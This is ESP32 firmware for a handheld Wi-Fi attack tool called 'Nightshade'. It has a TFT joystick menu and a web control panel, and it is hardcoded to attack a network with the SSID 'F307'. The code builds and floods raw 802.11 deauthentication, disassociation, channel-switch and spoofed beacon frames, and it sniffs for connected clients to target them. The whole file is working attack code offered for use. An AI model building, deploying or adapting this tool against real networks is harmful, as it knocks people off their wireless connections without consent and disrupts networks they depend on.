/*
 * ESP32 NIGHTSHADE — v4.2
 * TFT + Joystick + Web Interface
 * SoftAP: "RG's ESP32" | Password: rgisking
 * Still locked to F307 only
 */

#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include "esp32-hal.h"   // for temperatureRead()

#define TFT_CS 5
#define TFT_RST 17
#define TFT_DC 16
#define JOY_VRX 34
#define JOY_VRY 35
#define JOY_SW 32

#define TARGET_SSID "F307"
#define MAX_NETWORKS 25
#define MAX_CLIENTS 40
#define CLIENT_TIMEOUT 25000UL

Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);
AsyncWebServer server(80);

const int OX = 1, OY = 0;

// Colors
#define BLACK        0x0000
#define LBLUE        0x35ff
#define GREEN        0x0770
#define AQUA         0x05f8
#define RED          0xf800
#define MAGENTA      0xd01f
#define YELLOW       0xf7e0
#define WHITE        0xf7be
#define GRAY         0xbdd7
#define BLUE         0x001f
#define LGREEN       0x4fe9
#define LAQUA        0x07ff
#define PURPLE       0x881f
#define ORANGE       0xfc60
#define PINK         0xf818

struct Network { String ssid; uint8_t bssid[6]; int channel; int rssi; };
struct ClientEntry { uint8_t mac[6]; unsigned long lastSeen; };

Network networks[MAX_NETWORKS];
ClientEntry clients[MAX_CLIENTS];

int numNetworks = 0, numClients = 0, selectedIndex = 0;
int detailPage = 0, detailOption = 0;
bool inDetails = false, viewingClients = false;
int clientScroll = 0;

volatile bool sniffing = false, attacking = false;
volatile uint8_t attackMode = 0;
bool isBroadcastMode = false;
uint32_t packetCount = 0;

uint8_t targetBSSID[6] = {0};
int targetChannel = 1;

portMUX_TYPE clientMux = portMUX_INITIALIZER_UNLOCKED;
TaskHandle_t attackTaskHandle = NULL;

const uint8_t REASON_CODES[6] = {0x01, 0x02, 0x03, 0x04, 0x07, 0x08};

// Forward declarations
void stopAll();
void startSniff();
void startAttack(uint8_t m);
void drawNetworkList();
void drawClientList();
void drawDetails();

// ====================== FRAME BUILDERS ======================
void buildDeauth(uint8_t* b, const uint8_t* ap, const uint8_t* c, uint8_t r, uint16_t s) {
  b[0] = 0xC0; b[1] = 0x00;
  b[2] = 0x3A; b[3] = 0x01;
  memcpy(&b[4], c, 6);
  memcpy(&b[10], ap, 6);
  memcpy(&b[16], ap, 6);
  uint16_t sc = (s & 0xFFF) << 4;
  b[22] = sc & 0xFF; b[23] = (sc >> 8) & 0xFF;
  b[24] = r; b[25] = 0; b[26] = 0; b[27] = 0;
}

void buildDisassoc(uint8_t* b, const uint8_t* ap, const uint8_t* c, uint8_t r, uint16_t s) {
  b[0] = 0xA0; b[1] = 0x00;
  b[2] = 0x3A; b[3] = 0x01;
  memcpy(&b[4], c, 6);
  memcpy(&b[10], ap, 6);
  memcpy(&b[16], ap, 6);
  uint16_t sc = (s & 0xFFF) << 4;
  b[22] = sc & 0xFF; b[23] = (sc >> 8) & 0xFF;
  b[24] = r; b[25] = 0; b[26] = 0; b[27] = 0;
}

void buildCSA(uint8_t* b, const uint8_t* ap, uint8_t ch, uint8_t cnt, uint16_t s) {
  b[0] = 0xD0; b[1] = 0x00; b[2] = 0x00; b[3] = 0x00;
  memcpy(&b[4], (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
  memcpy(&b[10], ap, 6); memcpy(&b[16], ap, 6);
  uint16_t sc = (s & 0xFFF) << 4;
  b[22] = sc & 0xFF; b[23] = (sc >> 8) & 0xFF;
  b[24] = 0x0A; b[25] = 0x04; b[26] = 0x01; b[27] = ch; b[28] = cnt;
}

void buildQoSNull(uint8_t* b, const uint8_t* ap, const uint8_t* c, uint16_t s) {
  b[0] = 0x48; b[1] = 0x01; b[2] = 0x00; b[3] = 0x00;
  memcpy(&b[4], c, 6); memcpy(&b[10], ap, 6); memcpy(&b[16], ap, 6);
  uint16_t sc = (s & 0xFFF) << 4;
  b[22] = sc & 0xFF; b[23] = (sc >> 8) & 0xFF; b[24] = 0; b[25] = 0;
}

void buildBeacon(uint8_t* b, const uint8_t* ap, uint16_t s) {
  b[0] = 0x80; b[1] = 0x00; b[2] = 0x00; b[3] = 0x00;
  memcpy(&b[4], (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
  memcpy(&b[10], ap, 6); memcpy(&b[16], ap, 6);
  uint16_t sc = (s & 0xFFF) << 4;
  b[22] = sc & 0xFF; b[23] = (sc >> 8) & 0xFF;
  memset(&b[24], 0, 12); b[36] = 0x64; b[37] = 0; b[38] = 1; b[39] = 0;
  b[40] = 0; 
  b[41] = strlen(TARGET_SSID); 
  memcpy(&b[42], TARGET_SSID, strlen(TARGET_SSID));
}

// ====================== CLIENT MGMT ======================
bool validMAC(const uint8_t* m) {
  static const uint8_t nullMAC[6] = {0};
  if (memcmp(m, nullMAC, 6) == 0) return false;
  if ((m[0] & 1) == 1) return false;
  return true;
}

void addClient(const uint8_t* mac) {
  if (!validMAC(mac)) return;
  portENTER_CRITICAL(&clientMux);
  for (int i = 0; i < numClients; i++) {
    if (memcmp(clients[i].mac, mac, 6) == 0) {
      clients[i].lastSeen = millis();
      portEXIT_CRITICAL(&clientMux);
      return;
    }
  }
  if (numClients < MAX_CLIENTS) {
    memcpy(clients[numClients].mac, mac, 6);
    clients[numClients].lastSeen = millis();
    numClients++;
  }
  portEXIT_CRITICAL(&clientMux);
}

void cleanupStaleClients() {
  portENTER_CRITICAL(&clientMux);
  unsigned long now = millis();
  int j = 0;
  for (int i = 0; i < numClients; i++) {
    if (now - clients[i].lastSeen < CLIENT_TIMEOUT) {
      if (j != i) memcpy(&clients[j], &clients[i], sizeof(ClientEntry));
      j++;
    }
  }
  numClients = j;
  portEXIT_CRITICAL(&clientMux);
}

// ====================== SNIFFER ======================
void IRAM_ATTR snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!sniffing && !attacking) return;
  wifi_promiscuous_pkt_t* raw = (wifi_promiscuous_pkt_t*)buf;
  if (raw->rx_ctrl.sig_len < 24) return;

  uint8_t* p = raw->payload;
  uint16_t fc = *(uint16_t*)p;
  uint8_t ft = (fc & 0x000C) >> 2;
  uint8_t subtype = (fc & 0x00F0) >> 4;

  if (ft == 0x02) {
    bool toDS = (fc >> 8) & 1;
    bool fromDS = (fc >> 9) & 1;
    if (toDS && !fromDS && memcmp(&p[4], targetBSSID, 6) == 0) addClient(&p[10]);
    else if (!toDS && fromDS && memcmp(&p[10], targetBSSID, 6) == 0) addClient(&p[4]);
  }
  else if (ft == 0x00 && memcmp(&p[16], targetBSSID, 6) == 0) {
    if (subtype == 0x00 || subtype == 0x02 || subtype == 0x0B ||
        subtype == 0x05 || subtype == 0x0A || subtype == 0x0C) {
      if (memcmp(&p[10], targetBSSID, 6) != 0) addClient(&p[10]);
    }
  }
}

// ====================== ATTACK TASK ======================
void attackTask(void *pv) {
  uint8_t buf[128];
  uint32_t seq = 0;
  uint8_t rIdx = 0;
  unsigned long lc = 0;
  uint8_t safeMacs[5][6];

  while (true) {
    if (!attacking) {
      vTaskDelay(100 / portTICK_PERIOD_MS);
      continue;
    }

    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

    portENTER_CRITICAL(&clientMux);
    int snap = numClients;
    int copyCnt = min(5, snap);
    for (int i = 0; i < copyCnt; i++) memcpy(safeMacs[i], clients[i].mac, 6);
    portEXIT_CRITICAL(&clientMux);

    uint8_t reason = REASON_CODES[rIdx % 6];

    if (attackMode == 1 || attackMode == 4) {
      uint8_t t[6];
      if (snap > 0 && !isBroadcastMode) memcpy(t, safeMacs[0], 6);
      else memcpy(t, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);

      for (int i = 0; i < 5; i++) {
        buildDeauth(buf, targetBSSID, t, reason, seq++);
        esp_wifi_80211_tx(WIFI_IF_AP, buf, 28, false);
        buildDisassoc(buf, targetBSSID, t, reason, seq++);
        esp_wifi_80211_tx(WIFI_IF_AP, buf, 28, false);
      }
    }

    if (attackMode == 2 || attackMode == 4) {
      for (int i = 0; i < 6; i++) {
        uint8_t ch = ((targetChannel + i) % 11) + 1;
        buildCSA(buf, targetBSSID, ch, 4, seq++);
        esp_wifi_80211_tx(WIFI_IF_AP, buf, 29, false);
      }
    }

    if (attackMode == 3 || attackMode == 4) {
      for (int i = 0; i < 5; i++) {
        buildBeacon(buf, targetBSSID, seq++);
        esp_wifi_80211_tx(WIFI_IF_AP, buf, 60, false);
      }
    }

    if (snap > 0 && (attackMode == 1 || attackMode == 4)) {
      for (int c = 0; c < min(4, snap); c++) {
        buildQoSNull(buf, targetBSSID, safeMacs[c], seq++);
        esp_wifi_80211_tx(WIFI_IF_AP, buf, 26, false);
      }
    }

    packetCount = seq;
    rIdx++;
    if (millis() - lc > 2000) {
      cleanupStaleClients();
      lc = millis();
    }
    vTaskDelay(7 / portTICK_PERIOD_MS);
  }
}

// ====================== WEB UI HTML ======================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Nightshade</title>
<style>
  :root { --bg:#0f1115; --card:#1a1d24; --accent:#00ff9d; --text:#e0e0e0; --muted:#888; --danger:#ff4d4d; }
  * { box-sizing:border-box; margin:0; padding:0; font-family:system-ui,-apple-system,sans-serif; }
  body { background:var(--bg); color:var(--text); padding:16px; max-width:480px; margin:0 auto; }
  h1 { font-size:1.4rem; margin-bottom:4px; color:var(--accent); }
  .sub { color:var(--muted); font-size:0.85rem; margin-bottom:20px; }
  .card { background:var(--card); border-radius:12px; padding:16px; margin-bottom:14px; }
  .status { display:flex; justify-content:space-between; margin-bottom:10px; }
  .badge { padding:4px 10px; border-radius:20px; font-size:0.75rem; font-weight:600; }
  .on { background:#00ff9d22; color:var(--accent); }
  .off { background:#ffffff11; color:var(--muted); }
  .grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
  button { background:#252830; border:none; color:var(--text); padding:12px; border-radius:8px; font-size:0.9rem; cursor:pointer; }
  button:active { transform:scale(0.97); }
  button.primary { background:var(--accent); color:#000; font-weight:600; }
  button.danger { background:var(--danger); color:#fff; }
  .clients, .networks { font-family:monospace; font-size:0.8rem; line-height:1.7; max-height:200px; overflow-y:auto; }
  .net-item { padding:6px 0; border-bottom:1px solid #2a2d35; cursor:pointer; }
  .net-item:hover { color:var(--accent); }
  .error { color:var(--danger); font-size:0.85rem; margin-top:8px; display:none; }
  .info { font-size:0.85rem; color:var(--muted); margin-top:8px; }
</style>
</head>
<body>
  <h1>ESP32 Nightshade</h1>
  <div class="sub">Control Panel • Locked to <span id="targetName">F307</span></div>

  <div class="card">
    <div class="status"><span>Status</span><span id="statusBadge" class="badge off">IDLE</span></div>
    <div class="status"><span>Clients</span><span id="clientCount">0</span></div>
    <div class="status"><span>Packets</span><span id="packetCount">0</span></div>
    <div class="status"><span>Temperature</span><span id="temp">-- °C</span></div>
  </div>

  <div class="card">
    <div class="grid">
      <button onclick="cmd('sniff')">Sniff</button>
      <button onclick="cmd('deauth')">Deauth</button>
      <button onclick="cmd('csa')">CSA</button>
      <button onclick="cmd('beacon')">Beacon</button>
      <button onclick="cmd('chaos')">Chaos</button>
      <button class="danger" onclick="cmd('stop')">Stop All</button>
    </div>
  </div>

  <div class="card">
    <div style="margin-bottom:8px;font-weight:600">Wi-Fi Networks</div>
    <div id="networkList" class="networks">Loading...</div>
    <div id="lockError" class="error">This tool is locked to the target SSID only.</div>
  </div>

  <div class="card">
    <div style="margin-bottom:8px;font-weight:600">Connected Clients</div>
    <div id="clientList" class="clients">No clients yet</div>
  </div>

<script>
async function cmd(action) {
  await fetch('/cmd?action=' + action);
  update();
}

async function selectNet(ssid) {
  const r = await fetch('/select?ssid=' + encodeURIComponent(ssid));
  const t = await r.text();
  const err = document.getElementById('lockError');
  if (t === "LOCKED") {
    err.style.display = 'block';
  } else {
    err.style.display = 'none';
    update();
  }
}

async function update() {
  try {
    const r = await fetch('/status');
    const d = await r.json();

    document.getElementById('clientCount').innerText = d.clients;
    document.getElementById('packetCount').innerText = d.packets;
    document.getElementById('temp').innerText = d.temp + ' °C';
    document.getElementById('targetName').innerText = d.target;

    const badge = document.getElementById('statusBadge');
    if (d.attacking) {
      badge.innerText = d.mode;
      badge.className = 'badge on';
    } else if (d.sniffing) {
      badge.innerText = 'SNIFFING';
      badge.className = 'badge on';
    } else {
      badge.innerText = 'IDLE';
      badge.className = 'badge off';
    }

    // Networks
    const netList = document.getElementById('networkList');
    if (d.networks && d.networks.length) {
      netList.innerHTML = d.networks.map(n => 
        `<div class="net-item" onclick="selectNet('${n}')">${n}</div>`
      ).join('');
    } else {
      netList.innerText = 'No networks found';
    }

    // Clients
    const list = document.getElementById('clientList');
    if (d.macs && d.macs.length) {
      list.innerHTML = d.macs.join('<br>');
    } else {
      list.innerText = 'No clients yet';
    }
  } catch(e) {}
}

setInterval(update, 1500);
update();
</script>
</body>
</html>
)rawliteral";

// ====================== WEB HANDLERS ======================
void setupWebServer() {
  // Main page
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html", index_html);
  });

  // Status endpoint (with temperature + networks list)
  server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request) {
    String json = "{";
    json += "\"sniffing\":" + String(sniffing ? "true" : "false") + ",";
    json += "\"attacking\":" + String(attacking ? "true" : "false") + ",";
    json += "\"clients\":" + String(numClients) + ",";
    json += "\"packets\":" + String(packetCount) + ",";
    json += "\"temp\":" + String(temperatureRead(), 1) + ",";
    json += "\"target\":\"" + String(TARGET_SSID) + "\",";

    String mode = "IDLE";
    if (attackMode == 1) mode = "DEAUTH";
    else if (attackMode == 2) mode = "CSA";
    else if (attackMode == 3) mode = "BEACON";
    else if (attackMode == 4) mode = "CHAOS";
    json += "\"mode\":\"" + mode + "\",";

    // Networks list
    json += "\"networks\":[";
    for (int i = 0; i < numNetworks; i++) {
      if (i > 0) json += ",";
      json += "\"" + networks[i].ssid + "\"";
    }
    json += "],";

    // Clients
    json += "\"macs\":[";
    portENTER_CRITICAL(&clientMux);
    for (int i = 0; i < numClients; i++) {
      if (i > 0) json += ",";
      char mac[18];
      sprintf(mac, "\"%02X:%02X:%02X:%02X:%02X:%02X\"",
              clients[i].mac[0], clients[i].mac[1], clients[i].mac[2],
              clients[i].mac[3], clients[i].mac[4], clients[i].mac[5]);
      json += mac;
    }
    portEXIT_CRITICAL(&clientMux);
    json += "]}";

    request->send(200, "application/json", json);
  });

  // Select network endpoint
  server.on("/select", HTTP_GET, [](AsyncWebServerRequest *request) {
    if (!request->hasParam("ssid")) {
      request->send(400, "text/plain", "Missing ssid");
      return;
    }

    String ssid = request->getParam("ssid")->value();

    if (ssid != TARGET_SSID) {
      request->send(200, "text/plain", "LOCKED");
      return;
    }

    // Find and select F307
    for (int i = 0; i < numNetworks; i++) {
      if (networks[i].ssid == TARGET_SSID) {
        selectedIndex = i;
        request->send(200, "text/plain", "OK");
        return;
      }
    }

    request->send(200, "text/plain", "LOCKED");
  });

  // Command endpoint
  server.on("/cmd", HTTP_GET, [](AsyncWebServerRequest *request) {
    if (!request->hasParam("action")) {
      request->send(400, "text/plain", "Missing action");
      return;
    }

    String action = request->getParam("action")->value();

    // Safety lock
    if (numNetworks == 0 || networks[selectedIndex].ssid != TARGET_SSID) {
      bool found = false;
      for (int i = 0; i < numNetworks; i++) {
        if (networks[i].ssid == TARGET_SSID) {
          selectedIndex = i;
          found = true;
          break;
        }
      }
      if (!found) {
        request->send(403, "text/plain", "F307 not found / not selected");
        return;
      }
    }

    if (action == "sniff") {
      stopAll();
      startSniff();
    } else if (action == "deauth") {
      stopAll();
      startAttack(1);
    } else if (action == "csa") {
      stopAll();
      startAttack(2);
    } else if (action == "beacon") {
      stopAll();
      startAttack(3);
    } else if (action == "chaos") {
      stopAll();
      startAttack(4);
    } else if (action == "stop") {
      stopAll();
    }

    request->send(200, "text/plain", "OK");
  });

  server.begin();
}

// ====================== TFT UI ======================
void drawHeader() {
  tft.fillScreen(BLACK);
  tft.setTextSize(1);
  tft.setCursor(4 + OX, 6 + OY);
  tft.setTextColor(RED);
  tft.print("ESP32 NIGHTSHADE ");
  tft.setTextColor(WHITE);
  tft.print("v4.2");
  tft.drawLine(0, 18 + OY, 160, 18 + OY, GRAY);
}

void drawClientCount() {
  tft.fillRect(110, 22 + OY, 50, 40, BLACK);
  tft.setCursor(115 + OX, 25 + OY);
  tft.setTextColor(LGREEN);
  tft.print("C:"); tft.print(numClients);
  tft.setCursor(115 + OX, 36 + OY);
  tft.setTextColor(WHITE);
  tft.print("P:"); tft.print(packetCount % 10000);
}

void drawClientList() {
  tft.fillRect(0, 25 + OY, 160, 110, BLACK);
  tft.setCursor(5 + OX, 28 + OY);
  tft.setTextColor(AQUA);
  tft.print("CONNECTED CLIENTS");
  drawClientCount();
  portENTER_CRITICAL(&clientMux);
  int c = numClients;
  portEXIT_CRITICAL(&clientMux);
  tft.setTextColor(WHITE);
  for (int i = 0; i < 7; i++) {
    int idx = clientScroll + i;
    if (idx >= c) break;
    tft.setCursor(8 + OX, 42 + i * 11 + OY);
    tft.printf("%02X:%02X:%02X:%02X:%02X:%02X",
      clients[idx].mac[0], clients[idx].mac[1], clients[idx].mac[2],
      clients[idx].mac[3], clients[idx].mac[4], clients[idx].mac[5]);
  }
}

void drawDetails() {
  if (viewingClients) { drawClientList(); return; }
  drawHeader();
  Network& n = networks[selectedIndex];

  tft.setCursor(5 + OX, 25 + OY);
  tft.setTextColor(WHITE);
  tft.print("NETWORK DETAILS");

  tft.setCursor(5 + OX, 37 + OY);
  tft.setTextColor(WHITE); tft.print("SSID: ");
  tft.setTextColor(LGREEN);
  String s = n.ssid; if (s.length() > 12) s = s.substring(0, 12);
  tft.print(s);

  tft.setCursor(5 + OX, 48 + OY);
  tft.setTextColor(PURPLE);
  tft.print("Ch:"); tft.print(n.channel);
  tft.print("   ");
  tft.setTextColor(BLUE);
  tft.print("RSSI:"); tft.print(n.rssi);

  tft.setCursor(5 + OX, 59 + OY);
  tft.setTextColor(LAQUA);
  tft.printf("%02X:%02X:%02X:%02X:%02X:%02X",
    n.bssid[0], n.bssid[1], n.bssid[2], n.bssid[3], n.bssid[4], n.bssid[5]);

  tft.drawLine(0, 70 + OY, 160, 70 + OY, GRAY);

  tft.setCursor(5 + OX, 74 + OY);
  tft.setTextColor(PINK);
  tft.print(detailPage == 0 ? "PAGE 1 / 2" : "PAGE 2 / 2");

  const char* opt[7] = {"SNIFF", "DEAUTH", "CSA", "BEACON SPAM", "CHAOS", "CLIENTS", "BACK"};
  bool act[5] = {sniffing && !attacking, attackMode == 1, attackMode == 2, attackMode == 3, attackMode == 4};

  int start = (detailPage == 0) ? 0 : 4;
  int count = (detailPage == 0) ? 4 : 3;

  for (int i = 0; i < count; i++) {
    int idx = start + i;
    tft.setCursor(5 + OX, 88 + i * 11 + OY);
    if (idx == detailOption) {
      tft.setTextColor(LGREEN);
      tft.print(">> ");
      tft.print(opt[idx]);
    } else {
      tft.setTextColor(YELLOW);
      tft.print("   ");
      tft.print(opt[idx]);
    }
    if (idx < 5 && act[idx]) {
      tft.setTextColor(ORANGE);
      tft.print(" !");
    }
  }

  tft.setTextColor(PINK);
  tft.setCursor(125 + OX, 118 + OY);
  tft.print(detailPage + 1); tft.print("/2");

  if (sniffing || attacking) drawClientCount();
}

void drawNetworkList() {
  drawHeader();
  tft.setCursor(5 + OX, 28 + OY);
  for (int i = 0; i < 5 && (selectedIndex + i) < numNetworks; i++) {
    int idx = selectedIndex + i;
    if (i == 0) {
      tft.setTextColor(WHITE);
      tft.print(" >> ");
    } else {
      tft.setTextColor(YELLOW);
      tft.print("    ");
    }
    tft.setTextColor(YELLOW);
    String s = networks[idx].ssid;
    if (s.length() > 16) s = s.substring(0, 16);
    tft.println(s);
  }
  tft.setTextColor(GRAY);
  tft.setCursor(5 + OX, 118 + OY);
  tft.printf("%d/%d", selectedIndex + 1, numNetworks);
}

void scanNetworks() {
  drawHeader();
  tft.setCursor(8 + OX, 28 + OY);
  tft.setTextColor(LBLUE);
  tft.print("Scanning...");
  numNetworks = 0;
  int n = WiFi.scanNetworks(false, true);
  for (int i = 0; i < n && numNetworks < MAX_NETWORKS; i++) {
    if (WiFi.SSID(i).length() > 0) {
      networks[numNetworks].ssid = WiFi.SSID(i);
      memcpy(networks[numNetworks].bssid, WiFi.BSSID(i), 6);
      networks[numNetworks].channel = WiFi.channel(i);
      networks[numNetworks].rssi = WiFi.RSSI(i);
      numNetworks++;
    }
  }
  selectedIndex = 0;
  drawNetworkList();
}

void startSniff() {
  if (networks[selectedIndex].ssid != TARGET_SSID) return;
  memcpy(targetBSSID, networks[selectedIndex].bssid, 6);
  targetChannel = networks[selectedIndex].channel;
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  sniffing = true;
  attacking = false;
  numClients = 0;
}

void startAttack(uint8_t m) {
  if (networks[selectedIndex].ssid != TARGET_SSID) return;
  memcpy(targetBSSID, networks[selectedIndex].bssid, 6);
  targetChannel = networks[selectedIndex].channel;
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  attackMode = m;
  attacking = true;
  sniffing = true;
  isBroadcastMode = (m == 1);
}

void stopAll() {
  attacking = false;
  sniffing = false;
  attackMode = 0;
}

void handleJoystick() {
  int y = analogRead(JOY_VRY);
  bool p = digitalRead(JOY_SW) == LOW;

  if (p) {
    delay(180);
    if (viewingClients) {
      viewingClients = false;
      drawDetails();
      return;
    }

    if (inDetails) {
      if (detailOption == 0 && sniffing && !attacking) { stopAll(); drawDetails(); return; }
      if (detailOption == 1 && attackMode == 1) { stopAll(); drawDetails(); return; }
      if (detailOption == 2 && attackMode == 2) { stopAll(); drawDetails(); return; }
      if (detailOption == 3 && attackMode == 3) { stopAll(); drawDetails(); return; }
      if (detailOption == 4 && attackMode == 4) { stopAll(); drawDetails(); return; }

      if (detailOption == 0) { stopAll(); startSniff(); }
      else if (detailOption == 1) { stopAll(); startAttack(1); }
      else if (detailOption == 2) { stopAll(); startAttack(2); }
      else if (detailOption == 3) { stopAll(); startAttack(3); }
      else if (detailOption == 4) { stopAll(); startAttack(4); }
      else if (detailOption == 5) { viewingClients = true; clientScroll = 0; }
      else { stopAll(); inDetails = false; viewingClients = false; drawNetworkList(); return; }
      drawDetails();
    } else {
      inDetails = true;
      detailPage = 0;
      detailOption = 0;
      viewingClients = false;
      drawDetails();
    }
    return;
  }

  if (viewingClients) {
    if (y < 1400 && clientScroll > 0) { clientScroll--; drawClientList(); delay(80); }
    else if (y > 2600 && clientScroll < numClients - 7) { clientScroll++; drawClientList(); delay(80); }
    return;
  }

  if (!inDetails) {
    if (y < 1400 && selectedIndex > 0) { selectedIndex--; drawNetworkList(); delay(130); }
    else if (y > 2600 && selectedIndex < numNetworks - 1) { selectedIndex++; drawNetworkList(); delay(130); }
  } else {
    int oldPage = detailPage;
    int oldOpt = detailOption;

    if (y < 1400) {
      if (detailOption > (detailPage * 4)) detailOption--;
      else if (detailPage > 0) { detailPage--; detailOption = detailPage * 4 + 3; }
    } else if (y > 2600) {
      int maxOptThisPage = (detailPage == 0) ? 3 : 6;
      if (detailOption < maxOptThisPage) detailOption++;
      else if (detailPage == 0) { detailPage = 1; detailOption = 4; }
    }

    if (oldPage != detailPage || oldOpt != detailOption) drawDetails();
    delay(110);
  }
}

void setup() {
  Serial.begin(115200);
  pinMode(JOY_SW, INPUT_PULLUP);

  tft.initR(INITR_BLACKTAB);
  tft.setRotation(3);
  tft.fillScreen(BLACK);

  // SoftAP for Web UI + AP interface
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("RG's ESP32", "rgisking", 1, 0, 4);
  delay(300);

  WiFi.disconnect();
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_max_tx_power(WIFI_POWER_19_5dBm);

  xTaskCreatePinnedToCore(attackTask, "Attack", 16384, NULL, 1, &attackTaskHandle, 0);

  setupWebServer();
  scanNetworks();

  Serial.println("SoftAP started: RG's ESP32");
  Serial.println("Password: rgisking");
  Serial.println("Open http://192.168.4.1");
}

void loop() {
  handleJoystick();
  if (sniffing || attacking) {
    drawClientCount();
    delay(70);
  } else {
    delay(60);
  }
}